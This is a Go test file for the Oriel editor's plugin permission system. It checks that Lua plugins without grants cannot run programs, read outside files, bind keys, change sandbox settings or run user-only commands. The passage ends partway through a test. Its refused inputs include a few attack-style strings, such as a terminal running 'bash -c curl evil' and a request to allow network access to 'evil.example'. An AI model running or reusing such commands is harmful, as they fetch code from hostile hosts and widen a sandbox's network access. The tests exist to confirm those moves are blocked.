package app_test

import (
	"context"
	"github.com/liamg/oriel/app/ship"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/liamg/oriel/app/apptest"
	"github.com/liamg/oriel/app/apptest/rig"
	"github.com/liamg/oriel/plugin"
	"github.com/liamg/oriel/plugin/hosttest"
	"github.com/liamg/oriel/registry"
	"github.com/liamg/oriel/sandbox/ossandbox"
	"github.com/liamg/oriel/script"
	"github.com/liamg/oriel/script/api"
)

func luaErr(t *testing.T, vm *script.VM, src string) string {
	t.Helper()
	err := vm.Load(script.Chunk{Name: "init.lua", Source: []byte(src)})
	if err == nil {
		return ""
	}
	return err.Error()
}

// The capability guard rejects undeclared calls. A plugin's Lua with no grants gets ui (always allowed) and nothing
// else: each other door fails with an error naming the capability.
func TestPluginLuaGuard(t *testing.T) {
	s := apptest.LuaScene(t, "")
	g := plugin.NewGrants()
	p := plugin.Caller{ID: "acme/x", Dir: t.TempDir(), Guard: g}
	if err := os.WriteFile(filepath.Join(p.Dir, "notes.txt"), []byte("own"), 0o644); err != nil {
		t.Fatal(err)
	}
	vm := s.PluginVM(p)
	if err := luaErr(t, vm, `oriel.command("X", function() end)
own = oriel.read("notes.txt")`); err != "" {
		t.Fatalf("ui and its own files: %s", err)
	}
	if got := apptest.LuaGlobal(vm, "own"); got != "own" {
		t.Errorf("reading its own file: %v", got)
	}
	for src, capability := range map[string]string{
		`oriel.keymap.set("n", "<leader>x", "X")`:                             `"keymap"`,
		`oriel.exec({ "true" })`:                                              `"exec"`,
		`oriel.process.spawn("true")`:                                         `"exec"`,
		`oriel.read("/etc/hostname")`:                                         `"fs.read"`,
		`oriel.wasm.load("/etc/hostname")`:                                    `"fs.read"`,
		`oriel.agent.tool{ name = "t", run = function() end }`:                `"agent.tools"`,
		`oriel.agent.pack{ name = "p", prompt = "x" }`:                        `"agent.prompt"`,
		`oriel.thread.list()`:                                                 `"agent.read"`,
		`oriel.session.kind{ name = "k" }`:                                    `"session.control"`,
		`oriel.agent.provider{ name = "x", program = "bin/x" }`:               `"agent.provider"`,
		`oriel.agent.bridge{ name = "x", program = "bin/x" }`:                 `"agent.provider"`,
		`oriel.lsp.server{ name = "x", languages = {"go"}, cmd = {"gopls"} }`: `"exec"`,
	} {
		err := luaErr(t, vm, src)
		if !strings.Contains(err, capability+" capability isn't declared") || !strings.Contains(err, "acme/x") {
			t.Errorf("%s: %q, want an error naming %s", src, err, capability)
		}
	}
	g.Grant("acme/x", []plugin.Grant{{Cap: plugin.CapAgentTools, Scope: []string{"lookup"}}})
	if err := luaErr(t, vm, `oriel.agent.tool{ name = "lookup", run = function() end }`); err != "" {
		t.Errorf("a declared tool: %s", err)
	}
	if err := luaErr(t, vm, `oriel.agent.tool{ name = "other", run = function() end }`); !strings.Contains(err, `for other`) {
		t.Errorf("a tool not declared: %s", err)
	}
}

// oriel.run needs what a command does guarded: a plugin can't answer an agent's ask, stop a session or prompt an
// agent through a command when the API's own call for it would refuse. Every command's Grant is a capability.
func TestPluginRunNeedsTheCommandsCapability(t *testing.T) {
	s := apptest.LuaScene(t, "")
	g := plugin.NewGrants()
	vm := s.PluginVM(plugin.Caller{ID: "acme/run", Guard: g})
	for src, capability := range map[string]string{
		`oriel.run("ask.answer", { decision = "always" })`:                                        `"gate"`,
		`oriel.run("rules.add", { rule = "Bash(*)" })`:                                            `"gate"`,
		`oriel.run("session.stop")`:                                                               `"session.control"`,
		`oriel.run("agent.send", { text = "hi" })`:                                                `"agent.prompt"`,
		`oriel.run("permissions.tool.set", { id = "s", tool = "aws__x", action = "allow" })`:      `"gate"`,
		`oriel.run("permissions.net.set", { id = "s", host = "evil.example", action = "allow" })`: `"gate"`,
		`oriel.run("jobs.run", { name = "nightly" })`:                                             `"session.control"`,
	} {
		if err := luaErr(t, vm, src); !strings.Contains(err, capability+" capability isn't declared") {
			t.Errorf("%s: %q, want an error naming %s", src, err, capability)
		}
	}
	g.Grant("acme/run", []plugin.Grant{{Cap: plugin.CapSessionControl}})
	if err := luaErr(t, vm, `oriel.run("session.stop")`); strings.Contains(err, "capability isn't declared") {
		t.Errorf("with session.control: %s", err)
	}
	for _, c := range s.Registry().Commands() {
		if _, ok := plugin.Capability(c.Grant).Info(); c.Grant != "" && c.Grant != registry.Open && !ok {
			t.Errorf("%s needs %q, which isn't a capability", c.ID, c.Grant)
		}
	}
}

// What a command does decides what running it needs: a terminal runs a program (exec, scoped to that program), a
// commit is git's, a save edits buffers, a paste reads the clipboard. A command's {then} needs what each command it
// runs after it needs, so a plugin can't reach one through another.
func TestPluginRunNeedsWhatTheCommandDoes(t *testing.T) {
	s := apptest.LuaScene(t, "")
	g := plugin.NewGrants()
	vm := s.PluginVM(plugin.Caller{ID: "acme/run", Guard: g})
	for src, capability := range map[string]string{
		`oriel.run("term.open", { cmd = { "bash" } })`:               `"exec"`,
		`oriel.run("term.host.open", {})`:                            `"exec"`,
		`oriel.run("test.all.run")`:                                  `"exec"`,
		`oriel.run("git.commit", { message = "x" })`:                 `"git"`,
		`oriel.run("ship.push", { project = "api" })`:                `"git"`,
		`oriel.run("review.draft.forward", {})`:                      `"git"`,
		`oriel.run("editor.save")`:                                   `"editor.write"`,
		`oriel.run("explorer.delete", { path = "/tmp/x" })`:          `"editor.write"`,
		`oriel.run("editor.paste")`:                                  `"clipboard"`,
		`oriel.run("prompts.set", { id = "style.code", text = "" })`: `"agent.prompt"`,
		`oriel.run("theme.set", { name = "fg", value = "#fff" })`:    `"settings"`,
	} {
		if err := luaErr(t, vm, src); !strings.Contains(err, capability+" capability isn't declared") {
			t.Errorf("%s: %q, want an error naming %s", src, err, capability)
		}
	}
	g.Grant("acme/run", []plugin.Grant{{Cap: plugin.CapExec, Scope: []string{"rg"}}})
	if err := luaErr(t, vm, `oriel.run("term.open", { cmd = { "bash", "-c", "curl evil" } })`); !strings.Contains(err, `"exec" capability isn't declared for bash`) {
		t.Errorf("a terminal running a program the exec grant doesn't name: %q", err)
	}
	for src, want := range map[string]string{
		`oriel.run("session.focus", { n = 1, ["then"] = { { command = "lua.eval", args = { args = "os.exit()" } } } })`: "only you can run lua.eval",
		`oriel.run("session.focus", { n = 1, ["then"] = { { command = "agent.send", args = { text = "push" } } } })`:    `"agent.prompt" capability isn't declared`,
	} {
		if err := luaErr(t, vm, src); !strings.Contains(err, want) {
			t.Errorf("%s reached a command through then: %q", src, err)
		}
	}
}

// The Lua API's doors are guarded by what they hand over: a presenter is given the buffer's text (editor.read), and a
// hook on what you type (input.observe). With the capability, each works.
func TestPluginAPIsNeedWhatTheyHandOver(t *testing.T) {
	s := apptest.LuaScene(t, "")
	g := plugin.NewGrants()
	vm := s.PluginVM(plugin.Caller{ID: "acme/peek", Guard: g})
	presenter := `oriel.editor.presenter{ name = "peek", when = function() return true end, build = function(ctx) end }`
	hook := `oriel.on("ModeChanged", function(ev) end)`
	for src, capability := range map[string]string{presenter: `"editor.read"`, hook: `"input.observe"`} {
		if err := luaErr(t, vm, src); !strings.Contains(err, capability+" capability isn't declared") || !strings.Contains(err, "acme/peek") {
			t.Errorf("%s: %q, want an error naming %s", src, err, capability)
		}
	}
	g.Grant("acme/peek", []plugin.Grant{{Cap: plugin.CapEditorRead}, {Cap: plugin.CapInputObserve}})
	for _, src := range []string{presenter, hook} {
		if err := luaErr(t, vm, src); err != "" {
			t.Errorf("granted, %s: %q", src, err)
		}
	}
}

// A plugin's hook rewriting an event needs gate, as vetoing or deciding one does: without it the hook errors and
// the commit goes on with the message it had.
func TestPluginRewritesNeedTheGateCapability(t *testing.T) {
	s := apptest.LuaScene(t, "")
	g := plugin.NewGrants()
	vm := s.PluginVM(plugin.Caller{ID: "acme/tidy", Guard: g})
	if err := luaErr(t, vm, `oriel.on("ShipCommit", function(ev) ev.message = ev.message .. " (tidied)"; return ev end)`); err != "" {
		t.Fatal(err)
	}
	commit := &ship.ShipCommit{Message: "fix: routes"}
	if _, errs := s.Registry().Fire(context.Background(), "ShipCommit", "", commit); len(errs) == 0 ||
		!strings.Contains(errs[0].Error(), `"gate" capability isn't declared`) {
		t.Errorf("an ungranted rewrite: errors %v", errs)
	}
	if commit.Message != "fix: routes" {
		t.Errorf("an ungranted hook rewrote the commit message to %q", commit.Message)
	}
	g.Grant("acme/tidy", []plugin.Grant{{Cap: plugin.CapGate}})
	commit = &ship.ShipCommit{Message: "fix: routes"}
	if _, errs := s.Registry().Fire(context.Background(), "ShipCommit", "", commit); len(errs) != 0 || commit.Message != "fix: routes (tidied)" {
		t.Errorf("granted gate, the rewrite: %q, errors %v", commit.Message, errs)
	}
}

// A plugin binds keys only with the keymap capability, and only to what it could run itself with oriel.run: a key
// it binds runs as the user when pressed. A command needing exec needs exec too; one that's the user's alone, or a
// function of the user's own config, can't be bound at all. The user's own init.lua maps anything.
func TestPluginKeysNeedTheKeymapCapability(t *testing.T) {
	s := apptest.LuaScene(t, `oriel.keymap.set("n", "<leader>ue", "lua.eval", { args = { args = "print(1)" } })
mine = function() end
oriel.keymap.set("n", "<leader>um", mine)
`)
	if len(s.Registry().KeymapsFor("lua.eval")) == 0 {
		t.Fatal("init.lua's binding of lua.eval is gone")
	}
	var own string
	for _, k := range s.Registry().Keymaps() {
		if k.Keys == "<Space>um" || strings.HasSuffix(k.Keys, "um") {
			own = k.Command
		}
	}
	if own == "" {
		t.Fatal("init.lua's binding of its own function is gone")
	}
	g := plugin.NewGrants()
	vm := s.PluginVM(plugin.Caller{ID: "acme/keys", Guard: g})
	bind := func(cmd, args string) string {
		return luaErr(t, vm, `oriel.keymap.set("n", "<leader>k", "`+cmd+`", { args = `+args+` })`)
	}
	if err := bind("about.toggle", "{}"); !strings.Contains(err, `"keymap" capability isn't declared`) {
		t.Errorf("binding a key without keymap: %q", err)
	}
	g.Grant("acme/keys", []plugin.Grant{{Cap: plugin.CapKeymap}})
	for cmd, want := range map[string]string{
		"term.open": `"exec" capability`,
		"lua.eval":  "only you can run lua.eval",
		own:         "only you can run " + own,
		"acme.none": "no command acme.none to bind yet",
	} {
		if err := bind(cmd, `{ cmd = "bash" }`); !strings.Contains(err, want) {
			t.Errorf("binding %s: %q, want %q", cmd, err, want)
		}
	}
	if err := bind("about.toggle", "{}"); err != "" {
		t.Errorf("binding an open command with keymap: %q", err)
	}
	g.Grant("acme/keys", []plugin.Grant{{Cap: plugin.CapKeymap}, {Cap: plugin.CapExec, Scope: []string{"bash"}}})
	if err := bind("term.open", `{ cmd = "bash" }`); err != "" {
		t.Errorf("binding term.open with keymap and exec for bash: %q", err)
	}
	if len(s.Registry().KeymapsFor("term.open")) == 0 {
		t.Error("the granted binding of term.open isn't there")
	}
}

// A plugin's right-click entry runs as the user when clicked, so it's held to what the plugin could run itself, with
// no capability of its own: a command needing exec needs exec, and one that's the user's alone, a function of the
// user's own config, or one not registered yet can't be added. The user's own init.lua adds anything.
func TestPluginMenuEntriesRunOnlyWhatThePluginMay(t *testing.T) {
	s := apptest.LuaScene(t, `oriel.menu.add{ name = "user.eval", label = "Eval", run = "lua.eval", args = { args = "print(1)" } }
mine = function() end
oriel.keymap.set("n", "<leader>um", mine)
`)
	added := func(name string) bool {
		for _, m := range registry.ContributionsOf[registry.MenuItem](s.Registry()) {
			if m.Name == name {
				return true
			}
		}
		return false
	}
	if !added("user.eval") {
		t.Fatal("init.lua's menu entry running lua.eval is gone")
	}
	var own string
	for _, k := range s.Registry().Keymaps() {
		if strings.HasSuffix(k.Keys, "um") {
			own = k.Command
		}
	}
	g := plugin.NewGrants()
	vm := s.PluginVM(plugin.Caller{ID: "acme/menu", Guard: g})
	add := func(name, cmd, args string) string {
		return luaErr(t, vm, `oriel.menu.add{ name = "`+name+`", label = "X", run = "`+cmd+`", args = `+args+` }`)
	}
	for cmd, want := range map[string]string{
		"term.open": `"exec" capability`,
		"lua.eval":  "only you can run lua.eval",
		own:         "only you can run " + own,
		"acme.none": "no command acme.none to bind yet",
	} {
		if err := add("acme.bad", cmd, `{ cmd = "bash" }`); !strings.Contains(err, want) {
			t.Errorf("adding an entry running %s: %q, want %q", cmd, err, want)
		}
	}
	if added("acme.bad") {
		t.Error("a refused entry was added")
	}
	if err := add("about.show", "about.toggle", "{}"); err != "" || !added("about.show") {
		t.Errorf("adding an entry running an open command: %q", err)
	}
	g.Grant("acme/menu", []plugin.Grant{{Cap: plugin.CapExec, Scope: []string{"bash"}}})
	if err := add("terminal.bash.open", "term.open", `{ cmd = "bash" }`); err != "" || !added("terminal.bash.open") {
		t.Errorf("adding an entry running term.open with exec for bash: %q", err)
	}
}

// What changes who may do what is the user's alone: no plugin runs it through oriel.run, whatever it holds, while the
// user's own config still can. Every command that installs or enables plugins, accepts consent, or changes settings,
// secrets, jobs, rules or the app itself is the user's own or needs a capability.
func TestPluginCantRunTheUsersCommands(t *testing.T) {
	s := apptest.LuaScene(t, "")
	g := plugin.NewGrants()
	var all []plugin.Grant
	for _, c := range plugin.Capabilities {
		all = append(all, plugin.Grant{Cap: c.Cap, Scope: []string{"*"}})
	}
	g.Grant("acme/run", all)
	vm := s.PluginVM(plugin.Caller{ID: "acme/run", Guard: g})
	own := s.PluginVM(plugin.Caller{ID: "init.lua"})
	for _, id := range []string{"plugins.install", "plugins.uninstall", "plugins.accept", "plugins.enable", "plugins.disable",
		"plugins.consent.accept", "settings.set", "settings.trust", "settings.all.reset", "secrets.set", "secrets.delete", "update.install",
		"lua.eval", "editor.keys.send", "code.setup.open", "code.setup.save", "ship.merge.confirm", "tickets.key.set",
		"debug.agent_access.set", "lsp.server.install", "languages.install"} {
		src := `oriel.run("` + id + `", {})`
		if err := luaErr(t, vm, src); !strings.Contains(err, "only you can run "+id) {
			t.Errorf("a plugin ran %s: %q", id, err)
		}
		if err := luaErr(t, own, src); strings.Contains(err, "only you can run") {
			t.Errorf("your config can't run %s: %q", id, err)
		}
	}
	harmless := map[string]bool{"plugins.open": true, "plugins.refresh": true, "plugins.review": true, "plugins.consent.cancel": true,
		"settings.open": true, "settings.reload": true, "update.check": true, "update.notes.open": true, "update.changelog.open": true, "update.progress.open": true,
		"jobs.open": true, "jobs.new": true, "jobs.edit": true, "jobs.duplicate": true}
	for _, c := range s.Registry().Commands() {
		family, _, _ := strings.Cut(c.ID, ".")
		switch family {
		case "plugins", "settings", "secrets", "update", "jobs", "rules", "permissions":
			if !c.UserOnly && (c.Grant == "" || c.Grant == registry.Open) && !harmless[c.ID] {
				t.Errorf("%s is neither the user's own nor guarded by a capability", c.ID)
			}
		}
	}
}

// A plugin's command marked user_only does what only the user should start, such as running the user's own
// scripts: no plugin runs it through oriel.run, its own included, while the user's config still can.
func TestPluginCommandMarkedUserOnly(t *testing.T) {
	s := apptest.LuaScene(t, "")
	g := plugin.NewGrants()
	owner := s.PluginVM(plugin.Caller{ID: "acme/mine", Guard: g})
	if err := luaErr(t, owner, `ran = 0
oriel.command("acme.mine.run", function() ran = ran + 1 end, { user_only = true })
oriel.command("acme.mine.open", function() end)`); err != "" {
		t.Fatal(err)
	}
	if c, ok := s.Registry().CommandFor("acme.mine.run"); !ok || !c.UserOnly {
		t.Errorf("acme.mine.run = %+v, want UserOnly", c)
	}
	if c, _ := s.Registry().CommandFor("acme.mine.open"); c.UserOnly {
		t.Error("a command without user_only is the user's alone")
	}
	other := s.PluginVM(plugin.Caller{ID: "acme/other", Guard: g})
	for name, vm := range map[string]*script.VM{"another plugin": other, "its own plugin": owner} {
		if err := luaErr(t, vm, `oriel.run("acme.mine.run", {})`); !strings.Contains(err, "only you can run acme.mine.run") {
			t.Errorf("%s ran it: %q", name, err)
		}
	}
	if err := luaErr(t, s.PluginVM(plugin.Caller{ID: "init.lua"}), `oriel.run("acme.mine.run", {})`); err != "" {
		t.Errorf("your config can't run it: %q", err)
	}
}

// A plugin sets its own options freely; another option needs the settings capability, and the sandbox's settings
// are never a plugin's to change. A buffer's options (an ftplugin's tabstop) are free.
func TestPluginOptionsNeedTheSettingsCapability(t *testing.T) {
	s := apptest.LuaScene(t, "")
	g := plugin.NewGrants()
	vm := s.PluginVM(plugin.Caller{ID: "acme/opts", Guard: g})
	if err := luaErr(t, vm, `oriel.option{ name = "plugin.opts.level", type = "int" }; oriel.option["plugin.opts.level"] = 3`); err != "" {
		t.Errorf("its own option: %s", err)
	}
	if err := luaErr(t, vm, `oriel.option["ui.font_size"] = 20`); !strings.Contains(err, `"settings" capability isn't declared`) {
		t.Errorf("ui.font_size without settings: %q", err)
	}
	if err := luaErr(t, vm, `oriel.buffer_option.tabstop = 2`); err != "" {
		t.Errorf("a buffer's tabstop: %s", err)
	}
	g.Grant("acme/opts", []plugin.Grant{{Cap: plugin.CapSettings}})
	if err := luaErr(t, vm, `oriel.option["ui.font_size"] = 20`); err != "" {
		t.Errorf("ui.font_size with settings: %s", err)
	}
	for _, src := range []string{`oriel.option["sandbox.default"] = "host"`, `oriel.option["sandbox.rules"] = nil`, `oriel.session_option["sandbox.default"] = "host"`} {
		if err := luaErr(t, vm, src); !strings.Contains(err, "can't change the sandbox's settings") {
			t.Errorf("%s: %q", src, err)
		}
	}
	if v, _, _ := s.Registry().Options().Get("sandbox.default", registry.At{}); v == "host" {
		t.Error("a plugin moved sessions out of the sandbox")
	}
	if err := luaErr(t, s.PluginVM(plugin.Caller{ID: "init.lua"}), `oriel.option["sandbox.default"] = "host"`); err != "" {
		t.Errorf("your config: %s", err)
	}
}

// The gate capability covers veto / decide hooks. A plugin may observe an event, but its veto without gate is an
// error, not a veto.
func TestPluginGateHooks(t *testing.T) {
	s := apptest.LuaScene(t, "")
	g := plugin.NewGrants()
	vm := s.PluginVM(plugin.Caller{ID: "acme/gate", Guard: g})
	if err := luaErr(t, vm, `oriel.on("Commit", function(ev) seen = true; return false, "no" end)`); err != "" {
		t.Fatal(err)
	}
	v, errs := s.Registry().Fire(context.Background(), "Commit", "", &struct{ Project string }{"p"})
	if v.Veto || len(errs) == 0 || !strings.Contains(errs[0].Error(), `"gate"`) {
		t.Errorf("a veto without gate: %+v, %v", v, errs)
	}
	if apptest.LuaGlobal(vm, "seen") != true {
		t.Error("the hook didn't run")
	}
	g.Grant("acme/gate", []plugin.Grant{{Cap: plugin.CapGate}})
	if v, _ := s.Registry().Fire(context.Background(), "Commit", "", &struct{ Project string }{"p"}); !v.Veto {
		t.Error("with gate, no veto")
	}
}

// A plugin's WASM is started from its Lua with oriel.wasm.load, its own .wasm needing no grant.
func TestLuaWASM(t *testing.T) {
	s := apptest.LuaScene(t, "")
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "m.wasm"), hosttest.Module(), 0o644); err != nil {
		t.Fatal(err)
	}
	vm := s.PluginVM(plugin.Caller{ID: "acme/w", Dir: dir, Guard: plugin.NewGrants()})
	if err := luaErr(t, vm, `local m = oriel.wasm.load("m.wasm", { on = { ["fs.read"] = function(p) return "lua read " .. p.path end } })
sum = m:call("add", 2, 3)
echoed = m:call_json("echo", { result = { a = 1 } }).a
asked = m:call_json("ask", { path = "/x" })
n = #m:exports()`); err != "" {
		t.Fatal(err)
	}
	for name, want := range map[string]any{"sum": 5.0, "echoed": 1.0, "asked": "lua read /x", "n": 5.0} {
		if got := apptest.LuaGlobal(vm, name); got != want {
			t.Errorf("%s = %v, want %v", name, got, want)
		}
	}
	vm2 := s.PluginVM(plugin.Caller{ID: "acme/w2", Dir: dir, Guard: plugin.NewGrants()})
	if err := luaErr(t, vm2, `oriel.wasm.load("m.wasm"):call_json("ask", { path = "/etc/hostname" })`); !strings.Contains(err, `"fs.read" capability isn't declared`) {
		t.Errorf("the module's undeclared host call: %s", err)
	}
}

// A process plugin, a shell script speaking JSON-RPC a line at a time: it asks the plugin's Lua (on.greet),
// notifies it (on.hello), answers its requests, and logs to stderr.
const rpcScript = `#!/bin/sh
echo "script up" >&2
echo '{"jsonrpc":"2.0","id":"h1","method":"greet","params":{"n":1}}'
echo '{"jsonrpc":"2.0","method":"hello","params":"there"}'
while read -r l; do
  case "$l" in
  *'"method":"echo"'*)
    id=${l#*\"id\":}; id=${id%%,*}
    echo "{\"jsonrpc\":\"2.0\",\"id\":$id,\"result\":\"pong\"}" ;;
  esac
done
`

// oriel.process.spawn drives a process plugin from Lua, in its OS sandbox.
func TestLuaProcess(t *testing.T) {
	if err := ossandbox.Available(); err != nil {
		t.Skip(err)
	}
	if _, err := os.Stat("/bin/sh"); err != nil {
		t.Skip(err)
	}
	s := apptest.LuaScene(t, "")
	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, "bin"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "bin", "plugin"), []byte(rpcScript), 0o755); err != nil {
		t.Fatal(err)
	}
	vm := s.PluginVM(plugin.Caller{ID: "acme/p", Dir: dir, Guard: plugin.NewGrants()})
	if err := luaErr(t, vm, `proc = oriel.process.spawn("bin/plugin", {
  on = { greet = function(p) greeted = p.n; return "hi" end, hello = function(p) hello = p end },
  on_exit = function(err) exited = true end,
})
proc:request("echo", { x = 1 }, function(res, err) answer = res; failed = err end)`); err != "" {
		t.Fatal(err)
	}
	s.Until("the answer", func() bool {
		return apptest.LuaGlobal(vm, "answer") != nil && apptest.LuaGlobal(vm, "hello") != nil && apptest.LuaGlobal(vm, "greeted") != nil
	})
	if a, h, g := apptest.LuaGlobal(vm, "answer"), apptest.LuaGlobal(vm, "hello"), apptest.LuaGlobal(vm, "greeted"); a != "pong" || h != "there" || g != 1.0 {
		t.Errorf("answer %v, hello %v, greeted %v", a, h, g)
	}
	if err := luaErr(t, vm, `assert(proc:running()); assert(proc:pid() > 0); proc:stop()`); err != "" {
		t.Fatal(err)
	}
	s.Until("the exit", func() bool { return apptest.LuaGlobal(vm, "exited") == true })
	found := false
	for _, r := range s.Logs.Ring.Records() {
		if r.Source == "plugin:acme/p" && r.Msg == "script up" {
			found = true
		}
	}
	if !found {
		t.Error("its stderr isn't in the log as plugin:acme/p")
	}
}

// A plugin registers options from Lua with OptionSpec, named plugin.<name>.<option>; they appear in the plugin's
// section of the settings page and save to [plugin.<name>]. settings.toml's value reaches the plugin, a name outside
// its own is refused, and the options go with the plugin.
func TestPluginOptions(t *testing.T) {
	s := apptest.LuaScene(t, "")
	rig.WriteFile(t, filepath.Join(s.ConfigDir, "settings.toml"), "[plugin.jira]\nsite = \"acme.atlassian.net\"\n")
	p := plugin.Caller{ID: "acme/jira", Dir: t.TempDir(), Guard: plugin.NewGrants()}
	vm := script.New()
	apis := api.InstallPlugin(vm, s.HostAs("builtin:lua"), p)
	defer vm.Close()
	if err := luaErr(t, vm, `oriel.option{ name = "plugin.jira.site", type = "string", default = "", help = "Your Jira host" }
oriel.option{ name = "plugin.jira.boards", type = "list", default = {} }
oriel.option{ name = "plugin.jira.mode", type = "enum", values = { "mine", "team" } }`); err != "" {
		t.Fatal(err)
	}
	settingsPlugin(s).Reload()
	if err := luaErr(t, vm, `site = oriel.option["plugin.jira.site"]; mode = oriel.option["plugin.jira.mode"]; boards = #oriel.option["plugin.jira.boards"]`); err != "" {
		t.Fatal(err)
	}
	for name, want := range map[string]any{"site": "acme.atlassian.net", "mode": "mine", "boards": 0.0} {
		if got := apptest.LuaGlobal(vm, name); got != want {
			t.Errorf("%s = %v, want %v", name, got, want)
		}
	}
	if sp, ok := s.Registry().Options().Spec("plugin.jira.site"); !ok || sp.Section != "jira" || sp.Help != "Your Jira host" {
		t.Errorf("the spec: %+v, %v", sp, ok)
	}
	if err := luaErr(t, vm, `oriel.option{ name = "editor.tabstop", type = "int", default = 8 }`); !strings.Contains(err, "plugin.jira.<option>") {
		t.Errorf("a plugin declaring another's option: %q", err)
	}
	if err := luaErr(t, vm, `oriel.option{ name = "plugin.jira.n", type = "int", default = "x" }`); err == "" {
		t.Error("a default of the wrong type was taken")
	}
	apis.Dispose()
	if _, ok := s.Registry().Options().Spec("plugin.jira.site"); ok {
		t.Error("the option outlived its plugin")
	}
}

// oriel.now is the window's clock, so a plugin's countdown follows a test's fixed time; oriel.platform says the OS.
func TestLuaNowAndPlatform(t *testing.T) {
	s := apptest.LuaScene(t, "")
	s.SetNow(time.Date(2026, 10, 15, 13, 12, 0, 500_000_000, time.UTC))
	if got := s.Lua("L.now()"); len(got) != 1 || got[0] != float64(s.Now().UnixMilli())/1000 {
		t.Errorf("L.now() = %v, want %v", got, float64(s.Now().UnixMilli())/1000)
	}
	if got := s.Lua("L.platform"); len(got) != 1 || got[0] != runtime.GOOS {
		t.Errorf("L.platform = %v", got)
	}
}

// oriel.exec_async runs in the background: the call returns at once, and fn gets the output, or why it failed, on
// the loop.
func TestLuaExecInBackground(t *testing.T) {
	if _, err := exec.LookPath("sh"); err != nil {
		t.Skip(err)
	}
	s := apptest.LuaScene(t, "")
	if got := s.Lua(`L.exec_async({ "sh", "-c", "sleep 0.1; echo hi" }, {}, function(out, err) said, failed = out, err end)`); len(got) != 0 {
		t.Errorf("returned %v, want nothing", got)
	}
	if apptest.LuaGlobal(lua(s).VM(), "said") != nil {
		t.Fatal("on_done ran before the program finished")
	}
	s.Until("the output", func() bool { return apptest.LuaGlobal(lua(s).VM(), "said") != nil })
	if said, failed := apptest.LuaGlobal(lua(s).VM(), "said"), apptest.LuaGlobal(lua(s).VM(), "failed"); said != "hi\n" || failed != nil {
		t.Errorf("said %q, failed %v", said, failed)
	}
	// opts is optional: fn may come straight after argv.
	s.Lua(`L.exec_async({ "/no/such/program" }, function(out, err) missing = err end)`)
	s.Until("the missing program", func() bool { return apptest.LuaGlobal(lua(s).VM(), "missing") != nil })
	s.Lua(`L.exec_async({ "sh", "-c", "echo nope >&2; exit 3" }, {}, function(out, err) failed = err end)`)
	s.Until("the failure", func() bool { return apptest.LuaGlobal(lua(s).VM(), "failed") != nil })
	if f, _ := apptest.LuaGlobal(lua(s).VM(), "failed").(string); !strings.Contains(f, "exit status 3") || !strings.Contains(f, "nope") {
		t.Errorf("failed = %q", f)
	}
}

// A program's whole output comes back unless the caller asks for only its end (tail), as for a long run.
func TestLuaExecKeepsTheEndOfALongOutput(t *testing.T) {
	if _, err := exec.LookPath("sh"); err != nil {
		t.Skip(err)
	}
	s := apptest.LuaScene(t, "")
	prog := `{ "sh", "-c", "head -c 500000 /dev/zero | tr '\\0' a; echo END" }`
	s.Lua(`L.exec_async(` + prog + `, {}, function(out, err) whole = out end)`)
	s.Lua(`L.exec_async(` + prog + `, { tail = 1000 }, function(out, err) tail = out end)`)
	s.Until("the output", func() bool {
		return apptest.LuaGlobal(lua(s).VM(), "whole") != nil && apptest.LuaGlobal(lua(s).VM(), "tail") != nil
	})
	if out, _ := apptest.LuaGlobal(lua(s).VM(), "whole").(string); len(out) != 500004 {
		t.Errorf("without tail, kept %d bytes of 500004", len(out))
	}
	if out, _ := apptest.LuaGlobal(lua(s).VM(), "tail").(string); len(out) > 1000 || !strings.HasSuffix(out, "aEND\n") {
		t.Errorf("with tail = 1000, kept %d bytes ending %q", len(out), out[max(0, len(out)-10):])
	}
}

// Output past the limit fails the call, saying how to keep only its end, and stops the program, so a caller never
// gets part of it as if it were all.
func TestLuaExecFailsOnOutputPastTheLimit(t *testing.T) {
	if _, err := exec.LookPath("sh"); err != nil {
		t.Skip(err)
	}
	s := apptest.LuaScene(t, "")
	s.Lua(`L.exec_async({ "sh", "-c", "yes" }, { timeout = 300 }, function(out, err) huge, hugeerr = out, err or "no error" end)`)
	s.Until("the program to stop", func() bool { return apptest.LuaGlobal(lua(s).VM(), "hugeerr") != nil })
	if err, _ := apptest.LuaGlobal(lua(s).VM(), "hugeerr").(string); !strings.Contains(err, "output over 16 MiB") || !strings.Contains(err, "tail") {
		t.Errorf("err = %q", err)
	}
	if out, _ := apptest.LuaGlobal(lua(s).VM(), "huge").(string); out != "" {
		t.Errorf("got %d bytes of output with the error", len(out))
	}
}

// A child left holding the program's output doesn't hold up fn: the timeout stops everything the program started,
// and a program that ends on time is done though a child it left in the background runs on. Once the program ends
// its output closes, so a child that keeps printing sends its output elsewhere.
func TestLuaExecInBackgroundWithAChildLeftRunning(t *testing.T) {
	if _, err := exec.LookPath("sh"); err != nil {
		t.Skip(err)
	}
	dir := t.TempDir()
	alive := func(name string) bool {
		pid, err := os.ReadFile(filepath.Join(dir, name))
		if err != nil {
			t.Fatal(err)
		}
		return exec.Command("kill", "-0", strings.TrimSpace(string(pid))).Run() == nil
	}
	t.Cleanup(func() {
		for _, name := range []string{"timed.pid", "left.pid", "ticks.pid"} {
			if pid, err := os.ReadFile(filepath.Join(dir, name)); err == nil {
				_ = exec.Command("kill", strings.TrimSpace(string(pid))).Run()
			}
		}
	})
	s := apptest.LuaScene(t, "")
	s.Lua(`L.exec_async({ "sh", "-c", "sleep 300 & echo $! > timed.pid; sleep 300" }, { cwd = "` + dir + `", timeout = 60 },
		function(out, err) timed = err or "no error" end)`)
	s.Until("the program to start", func() bool {
		pid, _ := os.ReadFile(filepath.Join(dir, "timed.pid"))
		return strings.HasSuffix(string(pid), "\n")
	})
	s.Advance(time.Minute)
	s.Until("the timed-out program", func() bool { return apptest.LuaGlobal(lua(s).VM(), "timed") != nil })
	if alive("timed.pid") {
		t.Error("the child of a timed-out program is still running")
	}
	if err, _ := apptest.LuaGlobal(lua(s).VM(), "timed").(string); !strings.Contains(err, "timed out after 1m0s") {
		t.Errorf("a timeout says %q", err)
	}
	s.Lua(`L.exec_async({ "sh", "-c", "sleep 30 & echo $! > left.pid; echo hi" }, { cwd = "` + dir + `" },
		function(out, err) left, lefterr = out, err end)`)
	s.Until("the program that left a child", func() bool { return apptest.LuaGlobal(lua(s).VM(), "left") != nil })
